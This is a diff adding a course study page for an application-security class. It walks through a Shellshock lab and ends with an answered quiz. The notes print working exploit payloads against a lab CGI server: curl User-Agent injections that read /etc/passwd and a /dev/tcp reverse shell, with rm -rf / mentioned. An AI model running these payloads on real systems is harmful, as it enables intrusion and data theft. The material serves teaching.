@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Shellshock Part 2 — CSC351</title>
+  <link rel="stylesheet" href="shared/style.css">
+</head>
+<body>
+
+  <!-- Nav -->
+  <nav class="nav">
+    <div class="nav-inner">
+      <a class="nav-brand" href="index.html">
+        CSC351
+        <span class="nav-sep">/</span>
+        <span class="nav-topic">Shellshock: Part 2</span>
+      </a>
+      <a class="nav-back" href="shellshock.html">← Shellshock Hub</a>
+    </div>
+  </nav>
+
+  <!-- Mode indicator -->
+  <div class="mode-bar">
+    <div class="mode-bar-inner">
+      <span class="mode-step active" id="mode-1">Part 2 Notes</span>
+      <span class="mode-chevron">›</span>
+      <span class="mode-step" id="mode-2">Quiz</span>
+      <span class="mode-chevron">›</span>
+      <span class="mode-step" id="mode-3">Results</span>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════════════ -->
+  <!-- SCREEN: NOTES                                          -->
+  <!-- ══════════════════════════════════════════════════════ -->
+  <div id="screen-notes" class="screen">
+    <div class="content">
+      <div style="margin-bottom: 3rem;">
+        <h1 style="font-family: 'DM Serif Display', serif; font-size: 36px; letter-spacing: -1px; margin: 0 0 0.5rem;">Shellshock: Part 2</h1>
+        <p style="font-size: 14px; color: #2d3748; font-weight: 500; margin: 0;">Lecture 15 — CSC351 Application Security</p>
+      </div>
+
+      <!-- Section 1 — Where We Left Off -->
+      <div class="section">
+        <span class="label label-concept">Concept</span>
+        <h2 class="section-heading">Where We Left Off</h2>
+        <p class="body-text">Last lecture you learned that Bash has a bug.</p>
+        <p class="body-text">When a child Bash process starts up, it looks at its environment variables and tries to convert any that look like function definitions back into real functions. And the problem is that it doesn't stop reading at the end of the function. It keeps going and executes whatever comes after the closing <code>}</code>.</p>
+        <p class="body-text">That's the theory. **Today is where you watch it actually happen.**</p>
+      </div>
+
+      <!-- Section 2 — Step 1 — Proving the Victim Is Vulnerable -->
+      <div class="section">
+        <span class="label label-concept">Concept</span>
+        <h2 class="section-heading">Step 1 — Proving the Victim Is Vulnerable</h2>
+        <p class="body-text">Imagine you hired a new assistant at your office.</p>
+        <p class="body-text">You give them a stack of sticky notes with instructions before they start their shift. One sticky note says:</p>
+        <p class="body-text" style="font-style: italic; padding-left: 20px; border-left: 3px solid var(--border);">"If anyone calls, say hello. PS — also go unlock the safe in the back room."</p>
+        <p class="body-text">A well-trained assistant would read the job instruction — say hello — and stop there. They'd ignore anything after "PS" that wasn't part of their actual job.</p>
+        <p class="body-text">A badly trained assistant reads the whole note. **And unlocks the safe.**</p>
+        <p class="body-text">That's the test Ajan ran. He gave the vulnerable Bash a sticky note with an extra instruction hidden after the main task — and watched whether it stopped, or kept reading.</p>
+        <p class="body-text">The command he ran:</p>
+        <div class="code-block">
+          <pre><code>env x='() { :; }; echo vulnerable' ./bash_shellshock -c "echo test"</code></pre>
+        </div>
+        <p class="body-text">Breaking it down piece by piece so nothing is mysterious:</p>
+        <ul class="revision-list" style="margin: 16px 0;">
+          <li><strong>env</strong> — a Linux command that says "set this environment variable just for the next command I run."</li>
+          <li><strong>x='() { :; }; echo vulnerable'</strong> — this is the sticky note. The () { :; } is the main task — a blank function that does nothing. The ; echo vulnerable after the closing } is the hidden extra instruction.</li>
+          <li><strong>./bash_shellshock</strong> — this launches the vulnerable Bash. This is our badly trained assistant starting their shift.</li>
+          <li><strong>-c "echo test"</strong> — the actual job we're asking the assistant to do.</li>
+        </ul>
+        <p class="body-text">If Bash is patched (the well-trained version) — it reads the function, stores it, stops there. Runs echo test. Output: <strong><code>test</code></strong>.</p>
+        <p class="body-text">If Bash is vulnerable (the badly trained version) — it reads the function, doesn't stop at }, runs echo vulnerable, then runs echo test. Output: <strong><code>vulnerable</code> then <code>test</code></strong>.</p>
+        <p class="body-text">Ajan ran it against the lab's old <code>bash_shellshock</code>. Output: <code>vulnerable</code> then <code>test</code>.</p>
+        <p class="body-text">Then ran it against `/bin/bash` — the real modern Bash on his machine. Output: just <code>test</code>.</p>
+        <p class="body-text"><strong>Same machine. Same command. Two completely different behaviors. The proof was on screen.</strong></p>
+      </div>
+
+      <!-- Section 3 — Step 2 — Understanding the Bridge -->
+      <div class="section">
+        <span class="label label-concept">Concept</span>
+        <h2 class="section-heading">Step 2 — Understanding the Bridge</h2>
+        <p class="body-text">Okay. Here's where most explanations lose people. Because knowing Bash has a bug is one thing. But the attacker isn't sitting at the server's keyboard. They're somewhere on the internet. So how does their input get inside Bash on a server they've never touched?</p>
+        <p class="body-text">The answer is a mechanism called **CGI**. And to understand it, let's use a restaurant analogy — because this is the most important part of the whole attack.</p>
+        
+        <div class="callout callout-blue" style="margin-top: 20px;">
+          <p><strong>Imagine a restaurant.</strong></p>
+          <p>You're the customer sitting outside. You can't walk into the kitchen. There's a waiter who takes your order at the table and brings it to the chef inside.</p>
+          <p>The waiter doesn't just say "table 5 wants pasta." The waiter writes your exact words on a notepad and hands the whole notepad to the chef. Your exact phrasing, your exact special requests, everything.</p>
+          <p>Now imagine the chef is a bit dangerous. If you write "pasta please — also burn the restaurant down" on your order, and the waiter faithfully copies your exact words onto the notepad... the chef reads the whole thing and does both.</p>
+          <p><strong>You, the customer, just gave instructions to the chef without ever entering the kitchen.</strong></p>
+        </div>
+
+        <p class="body-text" style="margin-top: 20px;">In this analogy:</p>
+        <ul class="revision-list" style="margin: 16px 0;">
+          <li><strong>You</strong> = the attacker with a curl command.</li>
+          <li><strong>The waiter</strong> = the Apache web server.</li>
+          <li><strong>The notepad</strong> = environment variables passed to the child process.</li>
+          <li><strong>The chef</strong> = the vulnerable Bash running the CGI script.</li>
+          <li><strong>The kitchen</strong> = the server.</li>
+        </ul>
+        
+        <p class="body-text">Here's exactly what happens technically:<br>
+        When a browser visits a CGI script on Apache, Apache creates a child process to run that script. And it takes every HTTP request header — User-Agent, Host, Referer, everything — and passes them into that child process as environment variables.</p>
+        <p class="body-text">Ajan proved this live. He opened a browser and visited a CGI script called <code>getenv.cgi</code> whose only job was to print its own environment variables on screen.</p>
+        <p class="body-text">And there they were:<br>
+        <code>HTTP_HOST = seedlab-shellshock.com</code><br>
+        <code>HTTP_USER_AGENT = Mozilla/5.0 ...</code><br>
+        <code>HTTP_ACCEPT = text/html ...</code></p>
+        <p class="body-text">Every header the browser sent became a variable inside the CGI process. So if the attacker can control what goes into the HTTP header... and Apache faithfully copies that into an environment variable... and vulnerable Bash reads that environment variable and executes anything after a }... **the attacker just talked directly to the chef from outside the restaurant.**</p>
+      </div>
+
+      <!-- Section 4 — Step 3 — Enter curl -->
+      <div class="section">
+        <span class="label label-attack">The Tool</span>
+        <h2 class="section-heading">Step 3 — Enter curl</h2>
+        <p class="body-text">Web browsers won't let you freely edit HTTP headers. Chrome and Firefox decide what goes in User-Agent. You can't just type a Shellshock payload in there. **<code>curl</code> will.**</p>
+        <p class="body-text">Think of <code>curl</code> like writing your own order slip instead of letting the waiter use the standard form. You get to put whatever you want on it. Three flags. Know these for the exam:</p>
+        <ul class="revision-list" style="margin: 16px 0;">
+          <li><strong><code>curl -A "anything"</code></strong> → sets the User-Agent header to whatever you type.</li>
+          <li><strong><code>curl -e "anything"</code></strong> → sets the Referer header.</li>
+          <li><strong><code>curl -H "Custom: anything"</code></strong> → creates a completely new custom header.</li>
+        </ul>
+        <p class="body-text">Ajan proved each one. He ran <code>curl -v -A "my-data"</code> against the <code>getenv.cgi</code> script. In the output, the header was faithfully copied into the environment variable. Now he was ready to write something dangerous on that order slip.</p>
+      </div>
+
+      <!-- Section 5 — Step 4 — The Attack: Reading /etc/passwd -->
+      <div class="section">
+        <span class="label label-attack">The Attack</span>
+        <h2 class="section-heading">Step 4 — The Attack: Reading /etc/passwd</h2>
+        <p class="body-text"><code>/etc/passwd</code> is a file on every Linux server that lists all user accounts on the system. It's one of the first things an attacker looks for when they breach a server — it tells them who exists, what services are running, sometimes what level of access is possible.</p>
+        <p class="body-text">To read it with Shellshock, Ajan wrote this on his "order slip":</p>
+        <div class="code-block">
+          <pre><code>curl -A "() { :; }; echo; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd" http://seedlab-shellshock.com/cgi-bin/getenv.cgi</code></pre>
+        </div>
+        <p class="body-text">Let's walk through the User-Agent value he put in — the thing that goes in the environment variable:</p>
+        <ul class="revision-list" style="margin: 16px 0;">
+          <li><strong><code>() { :; };</code></strong> — the blank function. The decoy instruction on the front of the sticky note. Bash reads this and thinks "oh, this is a function definition I need to import."</li>
+          <li><strong><code>echo; echo Content-Type: text/plain; echo;</code></strong> — a formatting requirement. CGI scripts need to announce what type of content they're returning before they return it. Without this line, the web server gets confused and doesn't send the output back.</li>
+          <li><strong><code>/bin/cat /etc/passwd</code></strong> — the actual attack. Read this file and print it. Full path <code>/bin/cat</code> because inside a CGI environment you can't rely on shortcut command names — you have to spell out the full address.</li>
+        </ul>
+        <p class="body-text">Ajan hit enter. The server sent back <code>/etc/passwd</code>. Every user account. Every line. Printed in the terminal. From a curl command. From a laptop. Without logging in. Without a password. Without ever touching the server.</p>
+      </div>
+
+      <!-- Section 6 — Step 5 — Running Any Command -->
+      <div class="section">
+        <span class="label label-attack">Commands</span>
+        <h2 class="section-heading">Step 5 — Running Any Command</h2>
+        <p class="body-text">Here's where the full horror of the vulnerability becomes clear. The <code>/bin/cat /etc/passwd</code> at the end of the payload is just text. You can replace it with any Linux command. The chef executes whatever is on the slip. Ajan demonstrated a few:</p>
+        <p class="body-text"><strong>Getting the server's user ID:</strong></p>
+        <div class="code-block">
+          <pre><code>curl -A "() { :; }; echo; echo Content-Type: text/plain; echo; /bin/id" http://seedlab-shellshock.com/cgi-bin/getenv.cgi</code></pre>
+        </div>
+        <p class="body-text">Output: <code>uid=33(www-data) gid=33(www-data)</code>. The Apache web server runs as a user called <code>www-data</code>. That's the identity the attacker now has on the server.</p>
+        
+        <p class="body-text"><strong>Creating a file on the server:</strong></p>
+        <div class="code-block">
+          <pre><code>curl -A "() { :; }; /bin/touch /tmp/myfile" http://seedlab-shellshock.com/cgi-bin/getenv.cgi</code></pre>
+        </div>
+        <p class="body-text"><code>touch</code> creates a blank file. No output comes back, but Ajan went inside the Docker container, listed the <code>/tmp</code> directory, and the file was sitting there. Created by an HTTP header. From outside the server.</p>
+        
+        <p class="body-text">Ajan pointed out the implication out loud in the lecture: you could replace that command with <code>rm -rf /</code> — the Linux command that deletes everything on the entire filesystem, recursively, starting from the root. He called it "washing your hard drive." He was joking about doing it to the lab. On real vulnerable servers in 2014, some attackers were not joking.</p>
+      </div>
+
+      <!-- Section 7 — Step 6 — The Reverse Shell -->
+      <div class="section">
+        <span class="label label-attack">RCE shell</span>
+        <h2 class="section-heading">Step 6 — The Reverse Shell</h2>
+        <p class="body-text">Reading files and creating them is damaging. But what attackers actually want — the crown jewel of any server breach — is an interactive shell. A live terminal where they type a command, see the output, type another command, and see that output.</p>
+        <p class="body-text">This is called a **reverse shell**. And the name tells you exactly how it works.</p>
+
+        <div class="callout callout-blue">
+          <p><strong>Here's the analogy:</strong></p>
+          <p>Imagine you're trying to have a secret conversation with someone inside a locked building.</p>
+          <p>If you knock on the front door — the security guard blocks you. The building's policy is "we don't open the door for strangers."</p>
+          <p>But the policy says nothing about people inside calling out. The building allows internal phones to call external numbers.</p>
+          <p>So instead of knocking, you give your phone number to someone inside through a mail slot. You say: "Call me, and leave the line open. I'll talk to you through the phone."</p>
+          <p>They call you. The call goes through. Now you can have a conversation with someone inside — from outside — without ever going through the front door.</p>
+        </div>
+
+        <p class="body-text" style="margin-top: 20px;">Technically, this is what's happening:<br>
+        Firewalls block inbound connections. If the attacker tries to connect directly into the server (inbound) the firewall blocks them. But outbound connections are usually allowed. If the server connects out to the attacker, the firewall lets that through. **So the reverse shell forces the server to call the attacker.**</p>
+        
+        <p class="body-text">On the attacker's machine, Ajan opened a listener first — basically answering the phone before it rings:</p>
+        <div class="code-block">
+          <pre><code>nc -lv 1990</code></pre>
+        </div>
+        <p class="body-text"><code>nc</code> is netcat — a simple tool for making and receiving raw TCP connections. <code>-l</code> means listen, <code>-v</code> means verbose, and <code>1990</code> is the port number (like a phone extension).</p>
+        
+        <p class="body-text">Then, he sent the Shellshock payload:</p>
+        <div class="code-block">
+          <pre><code>curl -A "() { :; }; /bin/bash -i > /dev/tcp/10.9.0.1/1990 0<&1 2>&1" http://seedlab-shellshock.com/cgi-bin/getenv.cgi</code></pre>
+        </div>
+        <p class="body-text">Let's decode the command at the end:</p>
+        <ul class="revision-list" style="margin: 16px 0;">
+          <li><strong><code>/bin/bash -i</code></strong> — launch an interactive Bash shell on the server.</li>
+          <li><strong><code>> /dev/tcp/10.9.0.1/1990</code></strong> — redirect everything that shell outputs through a TCP connection to the attacker's IP address (10.9.0.1) on port 1990.</li>
+          <li><strong><code>0<&1</code></strong> — redirect the shell's input (stdin) to also come from that same connection.</li>
+          <li><strong><code>2>&1</code></strong> — redirect error messages through the same connection too.</li>
+        </ul>
+        <p class="body-text">Ajan hit enter on the curl command. On his netcat terminal, a shell prompt running on the server immediately appeared. He typed `ls`, and files listed. He typed `id`, and `uid=33(www-data)` came back. He was sitting at the server's keyboard. **Ajan's exact words in the transcript: "You got the root! Finally!"**</p>
+      </div>
+
+      <!-- Section 8 — Full Attack Chain -->
+      <div class="section">
+        <span class="label label-warn">Attack Chain</span>
+        <h2 class="section-heading">The Full Attack Chain — One Picture</h2>
+        <p class="body-text">Every step connected to the next. Here's the complete chain:</p>
+        <div class="defense-steps" style="margin: 20px 0;">
+          <div class="defense-step">
+            <span class="defense-step-badge" style="background: var(--accent-light); color: var(--accent); border-color: #c2c8d0;">1</span>
+            <div class="defense-step-text">Attacker types a curl command with a crafted User-Agent header containing the Shellshock payload.</div>
+          </div>
+          <div class="defense-step">
+            <span class="defense-step-badge" style="background: var(--accent-light); color: var(--accent); border-color: #c2c8d0;">2</span>
+            <div class="defense-step-text">curl sends an HTTP GET request to the Apache web server on the victim machine.</div>
+          </div>
+          <div class="defense-step">
+            <span class="defense-step-badge" style="background: var(--accent-light); color: var(--accent); border-color: #c2c8d0;">3</span>
+            <div class="defense-step-text">Apache receives the request and creates a child process to run the CGI script.</div>
+          </div>
+          <div class="defense-step">
+            <span class="defense-step-badge" style="background: var(--accent-light); color: var(--accent); border-color: #c2c8d0;">4</span>
+            <div class="defense-step-text">Apache copies all HTTP request headers into environment variables inside that child process.</div>
+          </div>
+          <div class="defense-step">
+            <span class="defense-step-badge" style="background: var(--accent-light); color: var(--accent); border-color: #c2c8d0;">5</span>
+            <div class="defense-step-text">The child process runs vulnerable Bash to execute the CGI script. Bash starts up, scans environment variables, sees HTTP_USER_AGENT starts with () {, compiles the function definition, and triggers parse_and_execute.</div>
+          </div>
+          <div class="defense-step">
+            <span class="defense-step-badge" style="background: var(--accent-light); color: var(--accent); border-color: #c2c8d0;">6</span>
+            <div class="defense-step-text">Bash parses the environment variable, doesn't stop reading at the closing }, and executes the trailing command payload.</div>
+          </div>
+        </div>
+        <p class="body-text">Remove any one step — no CGI, no Bash involved, Bash is patched — and the whole chain breaks. That's why Ajan said both conditions must be true: **vulnerable unpatched Bash, AND a CGI script on the web server.**</p>
+      </div>
+
+      <!-- Section 9 — Exam Tips -->
+      <div class="section">
+        <span class="label label-warn">Exam Tips</span>
+        <h2 class="section-heading">Exam / Scenario Tips</h2>
+        <p class="body-text">Ajan said out loud at the end of the last class: **"The Shellshock attack lab will definitely be asked in the Block 3 exam."**</p>
+        <p class="body-text">He will almost certainly give you a curl command and ask you to explain exactly why the server executes it. **The full-marks answer walks through every link in the chain.** The HTTP headers are passed as environment variables by Apache when it creates the CGI child process → the child process runs vulnerable Bash → Bash processes the variable, sees () { as a function, but doesn't stop reading at } → the command after the semicolon is executed on the server.</p>
+        <p class="body-text"><strong>The biggest trap is skipping the CGI step.</strong> Most students say "Bash executes the payload" without explaining how the payload got into Bash in the first place. The journey from HTTP header to environment variable to Bash execution is exactly what earns the marks.</p>
+        <p class="body-text"><strong>The second trap is the reverse shell question.</strong> If Ajan asks why the reverse shell connects outward from the server rather than the attacker connecting inward — the answer is firewalls. Servers block unsolicited inbound connections. The reverse shell exploits the fact that outbound connections are usually allowed, tricking the server into initiating the call.</p>
+      </div>
+
+      <!-- Ready button -->
+      <div class="btn-ready-wrap">
+        <button class="btn btn-primary btn-ready" onclick="goToQuiz(window._quiz)">Ready to test yourself →</button>
+      </div>
+
+    </div>
+  </div><!-- /screen-notes -->
+
+  <!-- ══════════════════════════════════════════════════════ -->
+  <!-- SCREEN: QUIZ                                           -->
+  <!-- ══════════════════════════════════════════════════════ -->
+  <div id="screen-quiz" class="screen hidden fading">
+
+    <!-- Quiz topbar -->
+    <div class="quiz-topbar">
+      <span class="quiz-topbar-left" id="quiz-progress-text">0 / 21 answered</span>
+      <div class="quiz-topbar-center">
+        <div class="quiz-progress-track">
+          <div class="quiz-progress-fill" id="quiz-progress-fill"></div>
+        </div>
+      </div>
+      <div class="quiz-topbar-right">
+        <button class="btn btn-primary" id="quiz-submit-btn" style="padding:7px 16px;font-size:13px;" disabled>Submit answers</button>
+      </div>
+    </div>
+
+    <!-- Questions -->
+    <div class="quiz-content">
+      <div id="quiz-container"></div>
+    </div>
+
+  </div><!-- /screen-quiz -->
+
+  <!-- ══════════════════════════════════════════════════════ -->
+  <!-- SCREEN: RESULTS                                        -->
+  <!-- ══════════════════════════════════════════════════════ -->
+  <div id="screen-results" class="screen hidden fading">
+    <div class="results-content">
+
+      <!-- Score -->
+      <div class="score-display">
+        <div>
+          <span class="score-big" id="score-number">0</span><span class="score-denom">/21</span>
+        </div>
+        <div class="score-pct" id="score-pct">0%</div>
+        <div class="score-grade" id="score-grade"></div>
+      </div>
+
+      <!-- AI Feedback -->
+      <span class="label label-concept" style="display:block;margin-bottom:12px;">AI Feedback</span>
+      <div id="feedback-loading" class="feedback-loading" style="display:none;">
+        <div class="spinner"></div>
+        <span>Analyzing your answers…</span>
+      </div>
+      <div id="feedback-box" class="feedback-box" style="display:none;"></div>
+
+      <!-- Actions -->
+      <div class="results-actions">
+        <button class="btn btn-secondary" onclick="window._quiz.retry()">↺ Retry quiz</button>
+        <button class="btn btn-secondary" onclick="window._quiz.reset()">← Back to notes</button>
+      </div>
+
+    </div>
+  </div><!-- /screen-results -->
+
+  <script src="shared/quiz.js"></script>
+  <script>
+    const questions = [
+      {
+        q: "What does 'Bash' stand for, and what is its role in a Linux system?",
+        code: null,
+        opts: [
+          "Binary Application Shell — it compiles programs into binary",
+          "Born Again Shell — it is the command-line interface that sits between the user and the OS kernel",
+          "Basic Automated Shell — it runs scheduled background tasks automatically",
+          "Bourne Advanced Shell — it replaces the Linux kernel in modern distributions"
+        ],
+        answer: 1,
+        source: "Ajan Lecture 14 + SEED Lab Shellshock"
+      },
+      {
+        q: "What is the difference between a parent process and a child process in Linux?",
+        code: null,
+        opts: [
+          "Parent processes run in memory; child processes run on disk",
+          "A parent process is the original running program; a child process is a new process launched from inside the parent, with its own separate memory space",
+          "Parent and child processes share the exact same memory and cannot be distinguished",
+          "Child processes always have higher CPU priority than parent processes"
+        ],
+        answer: 1,
+        source: "Ajan Lecture 14 — Process concepts"
+      },
+      {
+        q: "When a parent Bash process defines a function and wants to pass it to a child Bash process, how is this done?",
+        code: null,
+        opts: [
+          "Functions are automatically shared between all Bash processes on the system",
+          "The function is exported as an environment variable; when the child Bash starts, it converts the environment variable back into a function",
+          "Functions are stored in a shared file that all processes can read",
+          "The parent process must keep running for the child to access its functions"
+        ],
+        answer: 1,
+        source: "Ajan Lecture 14 — Shell functions and environment variables"
+      },
+      {
+        q: "What is the core bug in vulnerable Bash that causes the Shellshock vulnerability?",
+        code: null,
+        opts: [
+          "Bash uses an insecure encryption algorithm for storing passwords",
+          "When Bash converts an environment variable back into a function definition, it does not stop reading at the closing } and executes any commands written after it",
+          "Bash allows remote users to connect directly without authentication",
+          "Bash stores function definitions in a world-readable file that attackers can modify"
+        ],
+        answer: 1,
+        source: "CVE-2014-6271 — Huntress / Qualys / SEED Lab"
+      },
+      {
+        q: "The Shellshock vulnerability was publicly disclosed in 2014. How long had the bug existed in Bash before it was discovered?",
+        code: null,
+        opts: [
+          "About 6 months — it was introduced in a recent update",
+          "About 3 years — since Bash version 4.0 was released",
+          "Since 1989 — approximately 25 years before it was found",
+          "Since 2010 — it was introduced when Bash added function export support"
+        ],
+        answer: 2,
+        source: "CVE-2014-6271 — rootkid.in / Ajan Lecture 14"
+      },
+      {
+        q: "What is the CVE identifier assigned to the original Shellshock vulnerability?",
+        code: null,
+        opts: [
+          "CVE-2014-7169",
+          "CVE-2012-6271",
+          "CVE-2014-6271",
+          "CVE-2016-6271"
+        ],
+        answer: 2,
+        source: "Qualys Blog — CVE-2014-6271 / SEED Lab"
+      },
+      {
+        q: "What does the following command test, and how do you know if the system is vulnerable?",
+        code: "env x='() { :; }; echo vulnerable' ./bash_shellshock -c 'echo test'",
+        opts: [
+          "It tests network connectivity — vulnerable if the command times out",
+          "It tests whether Bash executes commands hidden after a function definition in an environment variable — vulnerable if 'vulnerable' appears BEFORE 'test' in the output",
+          "It tests whether Bash can create environment variables — vulnerable if no output appears",
+          "It tests file permissions — vulnerable if 'test' appears twice in the output"
+        ],
+        answer: 1,
+        source: "SEED Lab Shellshock Task 1 + Ajan Lecture 15"
+      },
+      {
+        q: "In the Shellshock proof-of-concept command, what does the () { :; }; part represent?",
+        code: "env x='() { :; }'; echo INJECTED",
+        opts: [
+          "A syntax error that crashes Bash and reveals the vulnerability",
+          "A blank function definition — the () { :; } is an empty function that does nothing, used to trigger Bash's function-import code path",
+          "An encryption key used to authenticate the environment variable",
+          "A special Bash operator that elevates privileges to root"
+        ],
+        answer: 1,
+        source: "SEED Lab + pentesterlab.com"
+      },
+      {
+        q: "What is CGI (Common Gateway Interface) and why is it critical to remote Shellshock exploitation?",
+        code: null,
+        opts: [
+          "CGI is a database interface — critical because it stores the Shellshock payload permanently",
+          "CGI is a method for generating dynamic web content using scripts — critical because when Apache runs a CGI script it creates a child Bash process and passes HTTP request headers as environment variables to it",
+          "CGI is a firewall component — critical because it blocks the Shellshock payload from being detected",
+          "CGI is a browser plugin — critical because it allows JavaScript to communicate with the server shell"
+        ],
+        answer: 1,
+        source: "SEED Lab + pentesterlab.com + Ajan Lecture 14 & 15"
+      },
+      {
+        q: "When Apache creates a CGI child process, which part of the HTTP request gets transformed into environment variables inside that child process?",
+        code: null,
+        opts: [
+          "Only the request body (POST data)",
+          "Only the URL path",
+          "The HTTP request headers — like User-Agent, Host, Referer, and custom headers",
+          "Only the session cookie"
+        ],
+        answer: 2,
+        source: "Ajan Lecture 15 — getenv.cgi demo"
+      },
+      {
+        q: "Why can't a normal web browser be used to launch a Shellshock attack, and what tool is used instead?",
+        code: null,
+        opts: [
+          "Browsers are too slow — attackers use a dedicated speed-optimized exploit framework",
+          "Browsers don't support HTTP — attackers use raw TCP sockets instead",
+          "Browsers don't allow users to freely customize HTTP request headers — curl is used instead because it gives full control over every header field",
+          "Browsers automatically patch Shellshock payloads before sending them — curl bypasses this filtering"
+        ],
+        answer: 2,
+        source: "Ajan Lecture 15 + INE blog"
+      },
+      {
+        q: "In a Shellshock attack using curl, what does the -A flag do?",
+        code: "curl -A '() { :; }; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd' http://target.com/cgi-bin/vul.cgi",
+        opts: [
+          "It sets the Authorization header with attack credentials",
+          "It sets the Accept-Encoding header for compressed payloads",
+          "It sets the User-Agent header — which Apache then passes to the CGI child process as the HTTP_USER_AGENT environment variable",
+          "It sets the target IP address for the attack"
+        ],
+        answer: 2,
+        source: "SEED Lab Task 3 + Ajan Lecture 15"
+      },
+      {
+        q: "In the Shellshock payload below, why are the 'echo Content-Type: text/plain' and blank echo lines required?",
+        code: "() { :; }; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd",
+        opts: [
+          "They are part of the Shellshock trigger syntax — without them Bash won't recognize the function definition",
+          "CGI scripts must output a Content-Type header followed by a blank line before any body content — without this, the web server doesn't know how to format the HTTP response and discards the output",
+          "They encrypt the payload so it isn't detected by firewalls",
+          "They tell Bash to run the command with elevated root privileges"
+        ],
+        answer: 1,
+        source: "SEED Lab Task 3 + Ajan Lecture 15"
+      },
+      {
+        q: "Which TWO conditions must both be true for a remote Shellshock attack to succeed against a web server?",
+        code: null,
+        opts: [
+          "The server must be running Windows and have port 80 open",
+          "The server must have an unpatched vulnerable version of Bash AND a CGI script that causes Apache to create a Bash child process",
+          "The attacker must have valid SSH credentials AND the server must have Bash installed",
+          "The server must have root login enabled AND the firewall must be disabled"
+        ],
+        answer: 1,
+        source: "Ajan Lecture 14 & 15 + rootkid.in"
+      },
+      {
+        q: "What is the correct order of the Shellshock attack chain from attacker to code execution?",
+        code: null,
+        opts: [
+          "Attacker modifies DNS → corrupts Apache config → Bash executes payload",
+          "Attacker sends crafted HTTP request → Apache creates CGI child process → headers become environment variables → vulnerable Bash executes payload hidden in the variable",
+          "Attacker sends SQL payload → database calls Bash → Bash executes payload",
+          "Attacker uploads a file → Apache runs it → file calls Bash with the payload"
+        ],
+        answer: 1,
+        source: "Ajan Lecture 15 + INE blog + SEED Lab"
+      },
+      {
+        q: "When Ajan ran the Shellshock attack to read /etc/passwd and the command returned output, what user identity was the server running the commands as?",
+        code: null,
+        opts: [
+          "root — because Apache always runs as root",
+          "nobody — a special restricted account with no permissions",
+          "www-data — the standard low-privilege user that Apache web server processes run as",
+          "The attacker's own user account from their laptop"
+        ],
+        answer: 2,
+        source: "Ajan Lecture 15 — /bin/id demo"
+      },
+      {
+        q: "What is a reverse shell, and why does it connect outward FROM the server TO the attacker rather than the other way around?",
+        code: null,
+        opts: [
+          "A reverse shell connects from attacker to server — called 'reverse' because it reverses the HTTP protocol",
+          "A reverse shell forces the server to connect outward to the attacker's machine — because firewalls typically block unsolicited inbound connections to servers but allow outbound connections",
+          "A reverse shell uses a reversed encryption key so the payload looks like normal traffic",
+          "A reverse shell runs commands in reverse order to avoid detection by IDS systems"
+        ],
+        answer: 1,
+        source: "Ajan Lecture 15 + rootkid.in"
+      },
+      {
+        q: "In the reverse shell attack, what does the attacker run on their own machine BEFORE sending the Shellshock curl command?",
+        code: "nc -lv 1990",
+        opts: [
+          "A web server to receive the stolen data",
+          "curl pointed at the target server to initiate the connection first",
+          "netcat (nc) in listen mode on a port — waiting for the server to call home",
+          "A Bash script that patches the server's Bash to install a backdoor"
+        ],
+        answer: 2,
+        source: "Ajan Lecture 15 — reverse shell demo"
+      },
+      {
+        q: "What does the reverse shell payload below actually do on the server, step by step?",
+        code: "/bin/bash -i > /dev/tcp/10.9.0.1/1990 0<&1 2>&1",
+        opts: [
+          "Downloads a file from 10.9.0.1 and saves it to /bin/bash",
+          "Starts an interactive Bash shell on the server and redirects its input, output, and errors through a TCP connection to the attacker's machine at 10.9.0.1 on port 1990",
+          "Deletes the Bash shell binary and replaces it with a backdoored version from 10.9.0.1",
+          "Encrypts all data on the server and sends the key to 10.9.0.1"
+        ],
+        answer: 1,
+        source: "Ajan Lecture 15 — reverse shell payload breakdown"
+      },
+      {
+        q: "According to the sources, Shellshock is described as what type of vulnerability in terms of what it enables an attacker to do?",
+        code: null,
+        opts: [
+          "A Denial of Service vulnerability — it crashes the server but cannot execute commands",
+          "A Remote Code Execution (RCE) vulnerability — it allows an attacker to run arbitrary commands on a vulnerable system",
+          "A privilege escalation vulnerability — it only works if the attacker already has local access",
+          "An information disclosure vulnerability — it can only read files, not execute commands"
+        ],
+        answer: 1,
+        source: "Huntress — CVE-2014-6271 analysis"
+      },
+      {
+        q: "What is the correct fix for Shellshock, and does patching Bash fully protect a server from all related bugs?",
+        code: null,
+        opts: [
+          "Disable CGI scripts — this fully prevents all Shellshock variants",
+          "Replace Apache with a different web server — Apache is the vulnerable component",
+          "Patch Bash to the latest version — but be aware that the initial CVE-2014-6271 patch was incomplete and a second bug CVE-2014-7169 was discovered shortly after",
+          "Set all CGI scripts to read-only — this prevents Bash from being invoked"
+        ],
+        answer: 2,
+        source: "Qualys Blog — CVE-2014-6271 patch analysis"
+      }
+    ];
+
+    const shellshockFeedbackPrompt = (score, wrongText) =>
+      `You are a CSC351 Application Security tutor at KMUTT. A student just completed a Shellshock practice quiz before their Block 3 exam.\n\nScore: ${score}/21\nWrong answers:\n${wrongText}\n\nWrite concise exam-focused feedback in plain text only. For each wrong answer write Q[number]: then one sentence explaining why the correct answer is right and why their choice was wrong. Then write "Review focus:" naming 2-3 specific Shellshock concepts to revisit. End with one short encouraging sentence. No markdown, no bullet symbols, no headers.`;
+
+    const quiz = new Quiz('quiz-container', questions, 'score_shellshock', shellshockFeedbackPrompt);
+    window._quiz = quiz;
+    quiz.build();
+  </script>
+
+</body>
+</html>
